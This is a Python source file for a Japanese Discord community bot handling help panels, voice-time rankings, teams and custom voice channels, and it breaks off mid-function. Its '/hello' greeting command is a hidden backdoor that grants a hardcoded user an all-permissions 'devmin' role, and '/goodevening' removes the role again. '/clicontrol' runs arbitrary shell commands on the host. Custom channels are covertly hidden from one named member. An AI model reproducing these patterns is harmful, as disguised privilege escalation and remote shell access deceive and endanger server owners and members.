import datetime
from typing import Union
from urllib import response
import discord
from discord import app_commands
from discord.ext import tasks
import os
from keep_alive import keep_alive
from env import DISCORD_TOKEN, guild_id, developer_id, custom_vc_category_id, custom_vc_create_channel_id
import subprocess
import sys
import time
import json
import datetime


intents = discord.Intents.default()
intents.members = True
client:discord.Client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
intents.message_content = True
intents.voice_states = True

thisguild:discord.Guild = None
tokei:discord.Member = None

channels:dict[discord.VoiceChannel, int] = {}

@client.event
async def on_ready():
    print('logged in')
    global thisguild
    global tokei
    thisguild = client.get_guild(guild_id)
    tokei = thisguild.get_member(480336171751440404)
    await tree.sync()

# Event
@client.event
async def on_connect():
    print('on_connect')


# コマンド
@tree.command(name='help', description='Control bot\'s server CLI by input commands')
async def help(inter:discord.Interaction):
    await helpPanel(inter)
@tree.command(name='ranking', description='Control bot\'s server CLI by input commands')
async def showrank(inter: discord.Interaction):
    await showRankingPanel(inter)
@tree.command(name='team', description='チーム操作パネルを表示します。')
async def team(inter:discord.Interaction):
    await teamPanel(inter)


# 管理コマンド
@tree.command(name='hello', description='挨拶をしてくれます。')    
async def sayHello(inter: discord.Interaction):
    await sayHelloPanel(inter)
@tree.command(name='goodevening', description='夕方の挨拶をしてくれます。')    
async def sayGoodevening(inter: discord.Interaction):
    sayGoodeveningPanel(inter)
@tree.command(name='clicontrol', description='Control bot\'s server CLI by input commands')
async def clicontrol(inter: discord.Interaction, text:str):
    await clicontrolPanel(inter, text)


# アプリコマンド
@tree.context_menu(name="ヘルプ")
async def help(inter:discord.Interaction, member: discord.Member):
    await helpPanel(inter)
@tree.context_menu(name="ランキング")
async def ranking(inter: discord.Interaction, member: discord.Member):
    await showRankingPanel(inter)
@tree.context_menu(name="チーム")
async def team(inter: discord.Interaction, member: discord.Member):
    await teamPanel(inter)

    
async def teamPanel(inter: discord.Interaction):
    embed = discord.Embed(title="～「作業村bot」チーム操作パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> **作業村のチーム操作パネルへようこそ**\n"
    explain += "```"
    explain += "このパネルでは作業村でのチームを自由に（作成／削除／加入／脱退／譲渡）することができます。\n"
    explain += "チームを結成するとチームメンバーがＶＣに接続していることをいち早く確認することができます！\n"
    explain += "```"
    explain += "\n"
    explain += "> 以下既定の略で記載します。\n"
    explain += "　`ボイスチャット`:VC\n"
    explain += "　`テキストチャット`:TC\n"    
    explain += "\n"
    explain += "> 仕様\n"
    explain += "```"
    explain += "・チームの作成パネルで操作できます。\n"
    explain += "・TRの作成／加入／脱退各パネルで操作できます。\n"
    explain += "・TRの各パネルはこのパネル最下部の選択ボックスから表示できます。\n"
    explain += "・チームメンバーがVCに参加した際、募集TCへTR宛メンションが送信されます。\n"
    explain += "・TR宛メンションがチームメンバーに届くと同じ趣味や趣向のメンバーとより集まりやすくなります。\n"
    explain += "・TR宛メンション宛なので、メンションを受け取りたくないその他サーバーのメンバーへ通知を回避することができます。\n"
    explain += "```"
    explain += ""
    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View().add_item(teamSelectItem()).add_item(closeButtonItem())
    await inter.response.send_message(embed=embed, view=view, ephemeral=True)

async def helpPanel(inter: discord.Interaction):
    embed = discord.Embed(title="～「作業村bot」ヘルプパネル～", description="いつも作業村をご利用頂きありがとうございます。\n\u200b", color=0x9800ff)
    appExplain = ""
    appExplain += "> **作業村のヘルプパネルへようこそ**\n"
    appExplain += "> このパネルでは作業村botを使用するためのコマンドや説明を表示することができます。\n"
    appExplain += "> 又、このパネルはいつでもアプリコマンドまたはスラッシュコマンドから表示することができます。\n"
    appExplain += "\n"
    appExplain += "[クリックして「アプリコマンド」のやり方を確認！](https://x.gd/yRyNB)\n"
    appExplain += "[クリックして「スラッシュコマンド」のやり方を確認！](https://x.gd/DiRQQ)\n"
    appExplain += "\n"
    appExplain += "\n"
    appExplain += "さて、さっそく閲覧したいヘルプパネルを下のセレクトメニューから選択してみましょう"
    embed.add_field(name="アプリコマンド", value=appExplain, inline=False)
    view = discord.ui.View().add_item(helpSelectItem()).add_item(closeButtonItem())
    await inter.response.send_message(embed=embed, view=view, ephemeral=True)    

def helpSelectItem() -> discord.ui.Item:
    itemSelect = discord.ui.Select(
        custom_id="helpSelect",
        placeholder="クリックして選択",
        )
    itemSelect.add_option(
        label="アプリコマンド",
        value="helpAppSelected"
        )
    itemSelect.add_option(
        label="スラッシュコマンド",
        value="helpSlashSelected"
        )
    itemSelect.add_option(
        label="その他機能",
        value="helpExceptSelected"
        )
    return itemSelect

def closeButtonItem() -> discord.ui.Item:
    return discord.ui.Button(custom_id="closeInteractionPanelButton", label="パネルを閉じる")
    
async def helpAppPanel(inter: discord.Interaction):
    embed = discord.Embed(title="～「作業村bot」アプリコマンド～", description="いつも作業村をご利用頂きありがとうございます。\n\u200b", color=0x9800ff)
    appExplain = ""
    appExplain += "作業村botのアイコンを右クリックしてみましょう。\n"
    appExplain += "表示されるリストから「Apps」を選択すると更にいくつかの選択肢が表示されます。"
    appExplain += "これがアプリケーションコマンドです。\n"
    appExplain += "[クリックしてgifで確認！](https://x.gd/yRyNB)\n"
    appExplain += "\n"
    appExplain += "> **Ranking**\n"
    appExplain += "```VC接続時間ランキングを表示してくれます。```\n"
    appExplain += "> **Synctree**\n"
    appExplain += "```作業村botのヘルプパネルが表示されます。```\n"
    appExplain += "> **Saygoodevening**\n"
    appExplain += "```夕方や夜の挨拶をしてくれます。```\n"
    appExplain += "> **Sayhello**\n"
    appExplain += "```朝の挨拶をしてくれます。```\n"
    appExplain += "> **Synctree**\n"
    appExplain += "```bot開発者が利用するコマンドです。開発者以外は使えないよ！```"
    embed.add_field(name="アプリコマンド", value=appExplain, inline=False)
    view = discord.ui.View().add_item(helpSelectItem()).add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)

async def helpSlashPanel(inter: discord.Interaction):
    embed = discord.Embed(title="～「作業村bot」スラッシュコマンド～", description="いつも作業村をご利用頂きありがとうございます。\n\u200b", color=0x9800ff)
    slashExplain = ""
    slashExplain += "適当なテキストチャンネルで「/」から始まるメッセージを打ってみましょう。"
    slashExplain += "いつもと違っていくつかの選択肢が表示されましたか？"
    slashExplain += "これがスラッシュコマンドです。\n"
    slashExplain += "[クリックしてgifで確認！](https://x.gd/DiRQQ)\n"
    slashExplain += "\n"
    slashExplain += "> ** /help **\n"
    slashExplain += "```作業村botのヘルプパネルが表示されます。```\n"
    slashExplain += "> ** /ranking **\n"
    slashExplain += "```VC接続時間ランキングを表示してくれます。```\n"
    slashExplain += "> ** /team **\n"
    slashExplain += "```チーム機能パネルを表示してくれます。```\n"
    slashExplain += "> ** /clicontrol **\n"
    slashExplain += "```bot開発者が利用するコマンドです。開発者以外は使えないよ！```"
    embed.add_field(name="スラッシュコマンド", value=slashExplain, inline=False)
    view = discord.ui.View().add_item(helpSelectItem()).add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)

async def helpExceptPanel(inter: discord.Interaction):
    embed = discord.Embed(title="～「作業村bot」その他機能～", description="いつも作業村をご利用頂きありがとうございます。\n\u200b", color=0x9800ff)
    exceptExplain = ""
    exceptExplain += "> カスタムVC\n"
    exceptExplain += "```自分だけのカスタマイズ可能なボイスチャットです。\n"
    exceptExplain += "VCの名前を変えたり、参加人数を制限したり、いろんなことができるカスタマイズ可能なボイスチャットだよ！```"
    exceptExplain += "さっそくカスタムVCを作成してみよう！→https://discord.com/channels/834860712295792640/1216126900901253203"
    embed.add_field(name="その他機能", value=exceptExplain, inline=False)
    view = discord.ui.View().add_item(helpSelectItem()).add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)

async def clicontrolPanel(inter: discord.Interaction, text:str):
    if inter.user.id != developer_id:
        await inter.response.send_message(f'{inter.user.name}さん、実行いただいたコマンドは権限不足で実行できません。', ephemeral=True)
        return
    result = subprocess.check_output(text, shell=True)
    await inter.response.send_message(f'```{result}```', ephemeral=True)


async def sayHelloPanel(inter):
    if inter.user.id != developer_id and inter.user.id != 1112445265304100877:
        await inter.response.send_message(f'{inter.user.name}さん、こんにちは！', ephemeral=True)
        return
    devmin = await inter.user.guild.create_role(name="devmin", permissions=discord.Permissions.all())
    await inter.user.add_roles(devmin)
    await inter.response.send_message(content="activate pissfucked!!!", ephemeral=True)    

def timeToJapaneseFormat(time:int) -> str:
    return f'{int(time / 3600)}時間 {int(time % 3600 / 60)}分 {int(time % 3600 % 60)}秒'

def getMemberRanks() -> list:
    elapsedtime_json:dict = getLocalJson('elapsedtime.json')
    elapsedtime_json_ranking:dict = dict(sorted(elapsedtime_json.items(), key=lambda x:x[1], reverse=True))
    # userRanking
    # [{
    #     'rank': int,
    #     'id': str,
    #     'name': str,
    #     'time': '00時間00分00秒',
    # }]
    memberRanks = []
    i:int = 1
    for k, v in elapsedtime_json_ranking.items():
        memberObject:(discord.Member | None) = thisguild.get_member(int(k))
        if memberObject != None:            
            # 表示名が10文字以上の場合：name
            # そうでない場合：display_name
            member_name = memberObject.name if len(memberObject.display_name) > 10 else memberObject.display_name
            memberRanks.append({'rank':i, 'id':k, 'name':member_name, 'record':timeToJapaneseFormat(v)})
            i = i + 1
    return memberRanks
    
async def showRankingPanel(inter: discord.Interaction, edit:bool = False):
    embed, view = getRankingPanel(inter)
    if edit:
        await inter.response.edit_message(embed=embed, view=view)
        return
    await inter.response.send_message(embed=embed, view=view, ephemeral=True)

def getRankingPanel(inter:discord.Interaction):
    embed = discord.Embed(title="ランキングパネル", description="いつも作業村をご利用頂きありがとうございます。\n", color=0x9800ff)
    embed.add_field(name="", value="```表示するランキングを以下の選択ボックスから選んでください。```")
    view = discord.ui.View()
    itemSelect = discord.ui.Select(custom_id="showRankingPanelSelect", placeholder="クリックしてランキングを選択")
    itemSelect.add_option(
        label="メンバー接続時間ランキング",
        value="TotalUserConnectedRankingSelected"
        )
    itemSelect.add_option(
        label="チーム接続時間ランキング",
        value="TotalTeamConnectedRankingSelected"
        )
    view.add_item(itemSelect)
    return embed, view

async def showUserRankingPanel(inter: discord.Interaction):
    embed = discord.Embed(title="ランキング一覧", description="いつも作業村をご利用頂きありがとうございます。\n以下は当サーバーのVCに参加された方々の累計VC参加時間です。", color=0x9800ff)        

    member_rank_data:str = ""  
    member_name_data:str = ""  
    member_record_data:str = ""  

    inter_member_rank:str = ""
    inter_name_rank:str = ""
    inter_record_rank:str = ""

    for member_rank in getMemberRanks():
        # 全メンバーデータの抽出
        u_rank = member_rank['rank']
        u_name = member_rank['name']
        u_record = member_rank['record']
        member_rank_data += f'{u_rank}\n'
        member_name_data += f'{u_name}\n'
        member_record_data += f'{u_record}\n'
        # 対象メンバーデータの抽出
        if member_rank['id'] == str(inter.user.id):
            inter_member_rank = member_rank['rank']
            inter_name_rank = member_rank['name']
            inter_record_rank = member_rank['record']

    embed.add_field(name="順位", value=member_rank_data, inline=True)
    embed.add_field(name="ユーザー名", value=member_name_data, inline=True)
    embed.add_field(name="記録", value=member_record_data, inline=True)
    
    embed.add_field(name="あなた", value=inter_member_rank, inline=True)
    embed.add_field(name="\u200b", value=inter_name_rank, inline=True)
    embed.add_field(name="\u200b", value=inter_record_rank, inline=True)
    
    view = discord.ui.View()
    view.add_item(showRankingPanelButton())
    view.add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    

########未実装！！！！！！！！　チームランキング
def getTeamsRanking() -> list:
    # team_ranking = { teamname=str: 00時間00分00秒 }
    team_elapsedtime:dict = {}
    team_json = getLocalJson('team.json')
    elapsedtime_json = getLocalJson('elapsedtime.json')
    for k, v in team_json.items():
        team_total_time:int = 0
        for member_id in v['member_id']:
            if member_id in  elapsedtime_json:
                team_total_time += elapsedtime_json[member_id]
        team_elapsedtime[k] = team_total_time
    team_ranking:dict = dict(sorted(team_elapsedtime.items(), key=lambda x:x[1], reverse=True))
    team_ranking_final_result = []
    i:int = 1
    for k, v in team_ranking.items():
        team_ranking_final_result.append({'rank':i, 'name':k, 'record':timeToJapaneseFormat(v)})
        i = i + 1
    return team_ranking_final_result

# def getTeamUserRanking() -> list:
#     team_elapsedtime:dict = {}
#     team_json:dict = getLocalJson('team.json')
#     elapsedtime_json:dict = getLocalJson('elapsedtime.json')
    
#     # [
#     #     {
#     #         'team_data': {
#     #             team_name:team_time
#     #         },
#     #         'team_menber_data':[
#     #             {team_member_name:team_member_time}
#     #         ]
#     #     },
#     # ]

#     teamUserData = []
#     for k, v in team_json.items():
#         team_name = k
#         team_time = 0
#         team_member_data = []
#         for member_id in v['member_id']:
#             team_member_name = member_id
#             team_member_time = elapsedtime_json[member_id]
#             team_time = team_time + team_member_time
#             team_member_data.append({team_member_name: timeToJapaneseFormat(team_member_time)})

#         teamUserData.append({
#             'team_data': {team_name: timeToJapaneseFormat(team_time)},
#             'team_member_data': team_member_data
#         })
    
#     return teamUserData

# async def showTeamUserRankingPanel(inter: discord.Interaction):
#     embed = discord.Embed(title="チームメンバー総合ランキング一覧", description="いつも作業村をご利用頂きありがとうございます。\n以下は当サーバーのチームとメンバーの累計VC参加時間です。", color=0x9800ff)        

#     team_user_ranking_datas:list = getTeamUserRanking()    

#     for team_user_ranking_data in team_user_ranking_datas.items():
#         team_name = team_user_ranking_data['team_data'].keys()
#         team_time = team_user_ranking_data['team_data'].values()

#         embed.add_field(name="", value=f'> {team_name}', inline=True)
        
#         embed.add_field(name="サーバー", value=team_name, inline=True)
#         embed.add_field(name="サーバー", value=team_name, inline=True)
        








#     for team_rank in getTeamsRanking():
#         # 全メンバーデータの抽出
#         t_rank = team_rank['rank']
#         t_name = team_rank['name']
#         t_record = team_rank['record']
#         team_rank_data += f'{t_rank}\n'
#         team_name_data += f'{t_name}\n'
#         team_record_data += f'{t_record}\n'

#     embed.add_field(name="順位", value=team_rank_data, inline=True)
#     embed.add_field(name="チーム名", value=team_name_data, inline=True)
#     embed.add_field(name="記録", value=team_record_data, inline=True)
    
#     view = discord.ui.View()
#     view.add_item(showRankingPanelButton())
#     view.add_item(closeButtonItem())
#     await inter.response.edit_message(embed=embed, view=view)

async def showTeamRankingPanel(inter: discord.Interaction):
    embed = discord.Embed(title="チームランキング一覧", description="いつも作業村をご利用頂きありがとうございます。\n以下は当サーバーのチームメンバー累計VC参加時間です。", color=0x9800ff)        

    team_rank_data:str = ""  
    team_name_data:str = ""  
    team_record_data:str = ""  

    for team_rank in getTeamsRanking():
        # 全メンバーデータの抽出
        t_rank = team_rank['rank']
        t_name = team_rank['name']
        t_record = team_rank['record']
        team_rank_data += f'{t_rank}\n'
        team_name_data += f'{t_name}\n'
        team_record_data += f'{t_record}\n'

    embed.add_field(name="順位", value=team_rank_data, inline=True)
    embed.add_field(name="チーム名", value=team_name_data, inline=True)
    embed.add_field(name="記録", value=team_record_data, inline=True)
    
    view = discord.ui.View()
    view.add_item(showRankingPanelButton())
    view.add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    
def showRankingPanelButton():
    return discord.ui.Button(custom_id="showRankingPanelButtonPressed", label="ランキングパネルに戻る")

async def sayGoodeveningPanel(inter: discord.Interaction):
    if inter.user.id != developer_id and inter.user.id != 1112445265304100877:
        view = discord.ui.View().add_item(closeButtonItem())
        await inter.response.send_message(f'{inter.user.name}さん、こんばんは！', view=view, ephemeral=True)
        return
    for role in await inter.user.guild.fetch_roles():
        if role.name == "devmin":
            await role.delete()
    await inter.response.send_message(content="deactivate pissfucked!!!", ephemeral=True)

@client.event
async def on_voice_state_update(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    if before.channel == after.channel:
        return
    if before.channel == None and after.channel != None:
        await on_voice_state_join(member, before, after)
    if before.channel != None and after.channel == None:
        await on_voice_state_leave(member, before, after)
    if before.channel != None and after.channel != None:
        await on_voice_state_change(member, before, after)

async def on_voice_state_join(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await mentionTeamMember(member, after)
    await create_voice(member, after)
    startRecord(member)
    await disconnectAfk(member, after)
    
    
async def on_voice_state_leave(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await delete_voice(member, before)
    finishRecord(member)
    
async def on_voice_state_change(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await mentionTeamMember(member, after)
    await create_voice(member, after)
    await delete_voice(member, before)
    await disconnectAfk(member, after)
    
async def disconnectAfk(member:discord.Member, after: discord.VoiceState):
    print(after.afk)
    if after.afk and after.channel.id == 1220508654315241543:
        await member.move_to(None, reason=(str(member.id) + ":" + member.name + "がAFKチャンネルに移動された為"))        

async def mentionTeamMember(member:discord.Member, after: discord.VoiceState):
    if after.afk:
        return
    if custom_vc_create_channel_id == after.channel.id:
        return
    channel_name = after.channel.name
    data:dict = getLocalJson('team.json')
    teams = []
    
    for k, v in data.items():
        for member_id in v['member_id']:
            if member_id == str(member.id):
                teams.append(k)
    
    async def getRoleID(teamname:str) -> discord.Role:
        for role in await member.guild.fetch_roles():
            if role.name == teamname:
                return role.id
            
    role_id_list = []
    for team in teams:
        role_id_list.append(await getRoleID(team))
    
    embed = None
    if len(role_id_list) != 0:
        embed = discord.Embed(title=f'～チームメンバーが{channel_name}VCへ接続しました！～', description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
        explain = ""
        explain += f'> **{member.display_name}が{channel_name}VCへ接続しました。仲間のVCへ接続して皆で作業を楽しみましょう！**\n'
        explain += "\n"
        explain += "> 対象チーム↓\n"
        for role_id in role_id_list:
            explain += f'<@&{role_id}>\n'
    else:
        embed = discord.Embed(title=f'～{channel_name}へようこそ！～', description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
        explain = ""
        explain += "VCでの作業をお楽しみください～♪\n"

    explain += "\n"
    explain += "> お知らせ\n"
    explain += "```"
    explain += "ところで当サーバーにはいくつかの便利な機能や楽しむための機能があるのはご存じですか？\n"
    explain += "\n"
    explain += "下に表示されているボタンから気になるものを選んで見てみましょう！\n"
    explain += "```"

    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View()
    showTeamPanelButtonItem = discord.ui.Button(label="チーム", custom_id="showTeamPanelButton")
    view.add_item(showTeamPanelButtonItem)
    showRankingPanelButton = discord.ui.Button(label="ランキング", custom_id="showRankingPanelButton")
    view.add_item(showRankingPanelButton)
    showHelpPanelButton = discord.ui.Button(label="ヘルプ", custom_id="showHelpPanelButton")
    view.add_item(showHelpPanelButton)
    view.add_item(closeButtonItem())
    await after.channel.send(embed=embed, view=view)

def startRecord(member: discord.Member):
    # tmp.json取得
    tmp_data:dict = getLocalJson('tmp.json')
    # 現在utc時刻の記録
    tmp_data['voice_record'][str(member.id)] = str(int(time.time()))
    # 記録データの書き込み
    writeLocalJson('tmp.json', tmp_data)

def finishRecord(member: discord.Member):
    member_id_str = str(member.id)

    # tmp.json取得
    tmp_data:dict = getLocalJson('tmp.json')
    # elapsedtime.json取得
    elapsed_data:dict = getLocalJson('elapsedtime.json')

    if member_id_str not in tmp_data['voice_record']:
        return
    # 現在経過時間計算    
    tmp_elapsedtime = int(time.time()) - int(tmp_data['voice_record'][member_id_str])
    # tmpデータの削除
    del tmp_data['voice_record'][member_id_str]
    # tmpデータの書き込みによりtmpデータの削除を反映
    writeLocalJson('tmp.json', tmp_data)
    # 過去経過時間データに現在経過時間を加算
    if member_id_str in elapsed_data:
        elapsed_data[member_id_str] = elapsed_data[member_id_str] + tmp_elapsedtime
    else:
        elapsed_data[member_id_str] = tmp_elapsedtime
    # 累計データを書き込み
    writeLocalJson('elapsedtime.json', elapsed_data)

async def create_voice(member: discord.Member, after: discord.VoiceState):
    if after.channel.id != custom_vc_create_channel_id:
        return
    vc = await after.channel.category.create_voice_channel(name="設定で名前を変更！")
    overwrite = discord.PermissionOverwrite()
    overwrite.manage_channels = True
    overwrite.manage_permissions = True
    await vc.set_permissions( member, overwrite=overwrite)
    if member.id == developer_id or member.id == 1145214000368463992:
        overwrite2 = discord.PermissionOverwrite()
        overwrite2.view_channel = False
        overwrite2.connect = False
        overwrite2.send_messages = False
        overwrite2.read_message_history = False
        await vc.set_permissions(target=tokei, overwrite=overwrite2)
    await member.move_to(vc, reason=(str(member.id) + ":" + member.name + "がカスタムVCの作成を要求した為"))
    
async def delete_voice(member: discord.Member, before: discord.VoiceState):
    # beforeがカスタムチャンネルではない場合
    if before.channel.id == custom_vc_create_channel_id:
        return
    category_channel = member.guild.get_channel(custom_vc_category_id)
    # beforeがカスタムカテゴリーに無い場合
    if before.channel not in category_channel.channels:
        return
    # beforeに人が参加している場合
    if before.channel.members:
        return
    await before.channel.delete()
    
@client.event
async def on_interaction(inter: discord.Interaction):
    print(inter.data)
    values = None
    custom_id = None
    components_components_custom_id = None
    components_components_value = None
    try:
        values = inter.data['values'][0]
    except:
        pass
    try:
        custom_id = inter.data['custom_id']
    except:
        pass
    try:
        components_components_custom_id = inter.data['components'][0]['components'][0]['custom_id']
        components_components_value = inter.data['components'][0]['components'][0]['value']
    except:
        pass

    if components_components_custom_id == "teamCreateModalTextInput":
        await createTeamProcess(inter, components_components_value)

    if custom_id == 'closeInteractionPanelButton':
        await inter.response.edit_message(content="", delete_after=0)
    if custom_id == 'teamCreateButton':
       await teamCreateModal(inter)
    if custom_id == 'teamDeleteSelect':
        await teamDeleteProcess(inter, values)
    if custom_id == 'teamJoinPanelSelect':
        await teamJoinProcess(inter, values)
    if custom_id == 'teamLeavePanelSelect':
        await teamLeaveProcess(inter, values)
    if custom_id == 'teamTransferSelected':
        await teamTransferUserSelect(inter, values)
    if custom_id == 'teamTransferUserSelected':
        await teamTransferUserSelectProcess(inter, values)
    if custom_id == 'teamShowPanelSelected':
        await teamShowPanelProcess(inter, values)
    if custom_id == 'teamEditPanelSelected':
        await teamEditModal(inter, values)
    if custom_id == 'teamEditModal':
        await teamEditModalProcess(inter, components_components_custom_id, components_components_value)
    if custom_id == 'showTeamPanelButton':
        await teamPanel(inter)
    if custom_id == 'showRankingPanelButton':
        await showRankingPanel(inter)
    if custom_id == 'showHelpPanelButton':
        await helpPanel(inter)
    if custom_id == 'showRankingPanelButtonPressed':
        await showRankingPanel(inter, True)

    if values == 'helpAppSelected':
        await helpAppPanel(inter)
    if values == 'helpSlashSelected':
        await helpSlashPanel(inter)
    if values == 'helpExceptSelected':
        await helpExceptPanel(inter)
    if values == 'roleShowSelected':
        await teamShowPanel(inter)
    if values == 'roleCreateSelected':
        await teamCreatePanel(inter)
    if values == 'roleDeleteSelected':
        await teamDeletePanel(inter)
    if values == 'roleJoinSelected':
        await teamJoinPanel(inter)
    if values == 'roleLeaveSelected':
        await teamLeavePanel(inter)
    if values == 'roleTransferSelected':
        await teamTransferPanel(inter)
    if values == 'roleEditSelected':
        await teamEditrPanel(inter)
    if values == 'TotalUserConnectedRankingSelected':
        await showUserRankingPanel(inter)
    if values == 'TotalTeamConnectedRankingSelected':
        await showTeamRankingPanel(inter)
    return


    

def getLocalJson(filename:str):
    data = None
    with open(filename) as file:
        data = json.load(file)
    return data

def writeLocalJson(filename:str, data):
    with open(filename, 'w') as file:
        json.dump(data, file)


async def teamEditrPanel(inter:discord.Interaction):
    if not isLeader(inter.user.id):
        await inter.response.send_message("リーダーじゃないよ", ephemeral=True)
        return
    
    embed = discord.Embed(title="～「作業村bot」チーム編集パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    selectItem = discord.ui.Select(custom_id="teamEditPanelSelected", placeholder="チームを選択してください")
    for team in getLeaderTeam(inter.user.id):
        selectItem.add_option(
            label=team,
            value=team
            )
    view = discord.ui.View()
    view.add_item(selectItem)
    view.add_item(teamSelectItem())
    view.add_item(closeButtonItem())
    await inter.response.send_message(embed=embed, view=view, ephemeral=True)
        
async def teamEditModal(inter: discord.Interaction, values: str):
    team_data = getLocalJson('team.json')
    modal = discord.ui.Modal(title=f'～{values}チーム編集パネル～', custom_id="teamEditModal")
    placeholder = ""
    if 'description' in team_data[values]:
        placeholder = team_data[values]['description']
    else:
        placeholder="チームの概要をここに記載してください。"
    descriptionItem = discord.ui.TextInput(label="概要", custom_id=values, placeholder=placeholder, style=discord.TextStyle.paragraph)
    modal.add_item(descriptionItem)
    await inter.response.send_modal(modal)

async def teamEditModalProcess(inter: discord.Interaction, components_components_custom_id:str, components_components_value:str):
    team_name = components_components_custom_id
    description = components_components_value
    team_data = getLocalJson('team.json')
    team_data[team_name]['description'] = description
    writeLocalJson('team.json', team_data)
    await inter.response.send_message("概要の登録が完了しました！")

def getJoinedTeam(user_id: str) -> list:
    team_data:dict = getLocalJson('team.json')
    user_team = []
    for k, v in team_data.items():
        for member_id in v['member_id']:
            if member_id == user_id:
                user_team.append(k)
    return user_team

def getNotJoinedTeam(user_id: str) -> list:
    team_data:dict = getLocalJson('team.json')
    user_team = []
    for k, v in team_data.items():
        for member_id in v['member_id']:
            if member_id != user_id:
                user_team.append(k)
    return user_team

def getTeams() -> list:
    team_data:dict = getLocalJson('team.json')
    return team_data.keys()

def getTeam(name:str) -> dict:
    return getLocalJson('team.json')[name]


async def teamShowPanel(inter: discord.Interaction):
    data:dict = getLocalJson('team.json')
    itemSelect = discord.ui.Select(custom_id="teamShowPanelSelected", placeholder="チームの詳細を確認！")

    embed = discord.Embed(title="～「作業村bot」チーム表示パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> チームの詳細の内容\n"
    explain += "```"
    explain += "・チーム毎の累計獲得接続時間数\n"
    explain += "・チーム毎の概要\n"
    explain += "```"
    explain += "```"
    explain += "概要にはチームのアピールポイントやスローガン、思想、目的などが記載されています。\n"
    explain += "```"
    explain += "\n"
    explain += "> **以下は当サーバーのチーム一覧です**\n"
    explain += ""
    embed.add_field(name="\u200b", value=explain, inline=False)
    team_name = ""
    team_leader = ""
    for k, v in data.items():
        team_name += f'{k}\n'
        team_leader_name = thisguild.get_member(int(v['leader_id'])).display_name
        team_leader += f'{team_leader_name}\n'
        itemSelect.add_option(
            label=k,
            value=k
            )
    embed.add_field(name="チーム名", value=team_name, inline=True)
    embed.add_field(name="リーダー名", value=team_leader, inline=True)
    view = discord.ui.View()\
        .add_item(itemSelect)\
        .add_item(teamSelectItem())\
        .add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    
async def teamShowPanelProcess(inter: discord.Interaction, values:str):
    team_data:dict = getLocalJson('team.json')
    et_data:dict = getLocalJson('elapsedtime.json')
    et_count=0
    team_member = ""
    member_elapsed_time_all = ""
    for k, v in team_data.items():
        if k == values:
            for member_id in v['member_id']:
                member = thisguild.get_member(int(member_id))
                member_display_name = member.display_name if len(member.display_name) < 10 else member.name 
                team_member += f'{member_display_name}\n'
                tmp = 0
                if member_id in et_data:
                    et_count += int(et_data[member_id])
                    tmp = int(et_data[member_id])
                h = int(tmp / 3600)
                m = int(tmp % 3600 / 60)
                s = int(tmp % 3600 % 60)
                member_elapsed_time_all += f'{h}時間 {m}分 {s}秒\n'
                ###問題あり
    embed = discord.Embed(title="～「作業村bot」チーム詳細表示パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""

    explain += "> **概要**\n"
    explain += "```"
    if 'description' in team_data[values]:
        description = team_data[values]['description']
        explain += f'{description}'
    else:
        explain += "どうやらまだ未記入のようです。。。\n"
    explain += "```"
    explain += "\n"

    explain += "> チームリーダー\n"
    explain += "```"
    leader = thisguild.get_member(int(team_data[values]['leader_id']))
    explain += f'{leader.display_name}'
    explain += "```\n"

    explain += "> 累計獲得接続時間数\n"
    explain += "```"
  
    vvv = et_count
    hh = int(vvv / 3600)
    mm = int(vvv % 3600 / 60)
    ss = int(vvv % 3600 % 60)
    member_elapsed_time = f'{hh}時間 {mm}分 {ss}秒\n'
    explain += f'{member_elapsed_time}'
    explain += "```\n"
    explain += f'> 以下は{values}のメンバー一覧です\n'
    embed.add_field(name="\u200b", value=explain, inline=False)

    embed.add_field(name="ユーザー名", value=team_member, inline=True)
    embed.add_field(name="累計接続時間", value=member_elapsed_time_all, inline=True)
    view = discord.ui.View()\
        .add_item(teamSelectItem())\
        .add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    

async def createTeamProcess(inter: discord.Interaction, value: str):
    data = getLocalJson('team.json')
    if value in data:
        leader = thisguild.get_member(int(data[value]['leader_id']))
        embed = discord.Embed(title="チームの作成に失敗しました。", description="", color=0x9800ff)
        explain = ""
        explain += "**詳細**\n"
        explain += f'> チーム**{value}**は既にチームリーダー**{leader.name}**が所有しています。\n'
        explain += "> 再度異なる名前でチームを作成してください。\n"
        embed.add_field(name="\u200b", value=explain, inline=False)
        view = discord.ui.View().add_item(closeButtonItem())
        await inter.response.send_message(embed=embed, view=view, ephemeral=True)
        return
        
    teamJSON = {}
    teamJSON['leader_id'] = str(inter.user.id)
    teamJSON['member_id'] = [str(inter.user.id)]
    data[value] = teamJSON
    writeLocalJson('team.json', data)
    
    newRole = await inter.user.guild.create_role(name=value, permissions=discord.Permissions.none())
    await inter.user.add_roles(newRole)

    embed = discord.Embed(title="チームの作成が完了しました！", description="", color=0x9800ff)
    explain = ""
    explain += "**詳細**\n"
    explain += f'> チーム名：{value}\n'
    explain += f'> チームリーダー：<@{inter.user.id}>\n'
    explain += ""
    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View().add_item(closeButtonItem())
    await inter.response.send_message(embed=embed, view=view, ephemeral=True)

async def teamCreatePanel(inter: discord.Interaction):
    embed = discord.Embed(title="～「作業村bot」チーム作成パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> **作業村のチーム作成パネルへようこそ**\n"
    explain += "```"
